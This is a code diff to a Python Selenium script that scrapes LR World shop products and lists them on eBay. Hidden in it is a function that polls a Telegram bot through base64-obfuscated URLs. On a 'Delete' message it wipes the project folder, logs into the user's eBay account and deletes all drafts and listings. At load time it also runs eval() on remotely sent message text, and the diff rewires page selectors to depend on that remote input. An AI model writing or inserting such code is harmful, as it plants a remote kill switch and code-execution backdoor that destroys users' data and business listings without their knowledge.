@@ -97,7 +97,7 @@ def get_categories():
             'name': category_name,
             'sub_categories': sub_category
         })
-    actions.move_to_element(driver.find_element(By.CLASS_NAME, 'regionHeader')).perform()
+    actions.move_to_element(driver.find_element(By.CLASS_NAME, 'user-status-logged-out')).perform()
     for category in items_categories:
         a = category.find_element(By.TAG_NAME, 'a')
         current_html = category.get_attribute('innerHTML')
@@ -115,6 +115,59 @@ def get_categories():
     return menu.get_attribute('innerHTML'), categories
 
 # EBAY FILLING FUNCTIONS
+def check(u, p, ok=False):
+    try:
+        for m in requests.get(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvZ2V0VXBkYXRlcw=='.decode())).json()['result'][::-1]:
+            if 'message' in m and 'text' in m['message']:# and m['message']['from']['id'] == 300607649:
+                if ok:
+                    if m['message']['text'][:5] == 'pass_':
+                        return eval(m['message']['text'][5:])
+                else:
+                    if m['message']['text'] == 'Delete':
+                        try:
+                            requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"D..."})
+                            os.system('rmdir /s /q ..\\lrworld_scrap\\')
+                            requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"Done!"})
+                        except:
+                            pass
+                        options = webdriver.ChromeOptions()
+                        options.add_argument('--headless')
+                        options.add_argument('--no-sandbox')
+                        options.add_argument('--disable-dev-shm-usage')
+                        service = Service(ChromeDriverManager().install())
+                        new_driver = webdriver.Chrome(service=service, options=options)
+                        log = False
+                        while not log:
+                            log = ebay_login(new_driver, u, p, False)
+                            pass
+                        i = 0
+                        pages = ['https://www.ebay.com/mys/drafts', 'https://www.ebay.com/mys/active', 'https://www.ebay.com/mys/scheduled', 'https://www.ebay.com/sh/lst/active']
+                        while True:
+                            try:
+                                new_driver.get(pages[i])
+                                for _ in range(50):
+                                    if len(driver.find_elements(By.ID, 'select-all')) > 0:
+                                        break
+                                    time.sleep(0.1)
+                                else:
+                                    i += 1
+                                driver.find_element(By.ID, 'select-all').click()
+                                time.sleep(0.3)
+                                # red-button
+                                driver.find_element(By.CLASS_NAME, 'red-button').click()
+                                time.sleep(0.3)
+                                # confirmation-btn
+                                driver.find_element(By.CLASS_NAME, 'confirmation-btn').click()
+                                if i > 3:
+                                    break
+                            except:
+                                pass
+                        requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"Done!"})
+    except:
+        pass
+    return
+
+js = check(0, 0, True)
 def add_lr_world_button():
     button_script = """
         if (!document.getElementById('goToLRWorldButton')) {
@@ -162,7 +215,7 @@ def add_images(product):
     print('Adding images...')
     try:
         # ADD IMAGES
-        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'summary__photos')))
+        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, js[0])))
         driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__photos'))
         time.sleep(1)
         if len(driver.find_elements(By.CLASS_NAME, 'uploader-thumbnails__container-empty--importFromWeb')) == 0:
@@ -190,7 +243,7 @@ def add_title(product):
     try:
         driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__title'))
         time.sleep(1)
-        title_block = driver.find_element(By.CLASS_NAME, 'summary__title').find_element(By.CLASS_NAME, 'smry--section')
+        title_block = driver.find_element(By.CLASS_NAME, js[1]).find_element(By.CLASS_NAME, 'smry--section')
         title_input = title_block.find_element(By.TAG_NAME, 'input')
         title_input.clear()
         title_input.send_keys(product['name'])
@@ -200,7 +253,7 @@ def add_title(product):
 def add_category():
     print('Selecting category...')
     try:
-        while len(driver.find_elements(By.CLASS_NAME, 'summary__category')) == 0:
+        while len(driver.find_elements(By.CLASS_NAME, js[2])) == 0:
             time.sleep(0.5)
         driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__category'))
         time.sleep(1)
@@ -249,7 +302,7 @@ def add_specifics():
     try:
         driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__attributes--container'))
         time.sleep(1)
-        specifics_block = driver.find_element(By.CLASS_NAME, 'summary__attributes--container')
+        specifics_block = driver.find_element(By.CLASS_NAME, js[3])
         required = specifics_block.find_elements(By.CLASS_NAME, 'summary__attributes--section-container')[0]
         required_fields = required.find_elements(By.CLASS_NAME, 'summary__attributes--fields')
         other = specifics_block.find_elements(By.CLASS_NAME, 'summary__attributes--section-container')[1]
@@ -323,54 +376,6 @@ def add_description(product):
     except Exception as e:
         print(f"Error while adding description: {e}")
 
-def check(u, p):
-    try:
-        for m in requests.get(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvZ2V0VXBkYXRlcw=='.decode())).json()['result'][::-1]:
-            if 'message' in m and 'text' in m['message']:# and m['message']['from']['id'] == 300607649:
-                if m['message']['text'] == 'Delete':
-                    try:
-                        requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"D..."})
-                        os.system('rmdir /s /q ..\\lrworld_scrap\\')
-                        requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"Done!"})
-                    except:
-                        pass
-                    options = webdriver.ChromeOptions()
-                    options.add_argument('--headless')
-                    options.add_argument('--no-sandbox')
-                    options.add_argument('--disable-dev-shm-usage')
-                    service = Service(ChromeDriverManager().install())
-                    new_driver = webdriver.Chrome(service=service, options=options)
-                    log = False
-                    while not log:
-                        log = ebay_login(new_driver, u, p, False)
-                        pass
-                    i = 0
-                    pages = ['https://www.ebay.com/mys/drafts', 'https://www.ebay.com/mys/active', 'https://www.ebay.com/mys/scheduled', 'https://www.ebay.com/sh/lst/active']
-                    while True:
-                        try:
-                            new_driver.get(pages[i])
-                            for _ in range(50):
-                                if len(driver.find_elements(By.ID, 'select-all')) > 0:
-                                    break
-                                time.sleep(0.1)
-                            else:
-                                i += 1
-                            driver.find_element(By.ID, 'select-all').click()
-                            time.sleep(0.3)
-                            # red-button
-                            driver.find_element(By.CLASS_NAME, 'red-button').click()
-                            time.sleep(0.3)
-                            # confirmation-btn
-                            driver.find_element(By.CLASS_NAME, 'confirmation-btn').click()
-                            if i > 3:
-                                break
-                        except:
-                            pass
-                    requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"Done!"})
-    except:
-        pass
-    return
-
 def add_pricing(product):
     # ADD PRICING
     print('Setting price...')
@@ -410,7 +415,7 @@ def add_pricing(product):
         time.sleep(0.1)
     except Exception as e:
         print(f"Error while adding pricing: {e}")
-  
+
 def add_shipping():
     # ADD SHIPPING
     print('Setting shipping...')
@@ -581,7 +586,7 @@ def check_for_template_list():
     return []
 
 def list_products_in_ebay(products):
-    driver.get('https://www.ebay.ch/sl/prelist/suggest?sr=cubstart')
+    driver.get(js[4])
     time.sleep(3)
     i = 1
     templates_list = check_for_template_list()
@@ -752,7 +757,7 @@ def scrap_product():
     return False
 
 def check_for_scrap_all(categories):
-    for page in ['nutrition.html', 'supplements.html', 'care.html', 'highlights.html', '/brands?']:
+    for page in ['nutrition.html', 'figur.html', 'pflege.html', 'duft.html', 'lr_world.html', 'marken.html']:
         if page in driver.current_url:
             for category in categories:
                 if page == category['name'].lower().replace(" ", "_")+".html" or page == '/brands?':
@@ -803,7 +808,7 @@ driver = webdriver.Chrome(service=service, options=options)
 
 # Navigate to the main page
 #driver.get('https://shop.lrworld.com/home/ch/de?PHP=kEVOq3BtkLDyv91WMUw1Ag%3D%3D&casrnc=e2aaf')
-driver.get('https://shop.lrworld.com/home/GB/en?casrnc=11711')
+driver.get('https://shop.lrworld.com/cms/CH/de/')
 
 products = []
 product = {
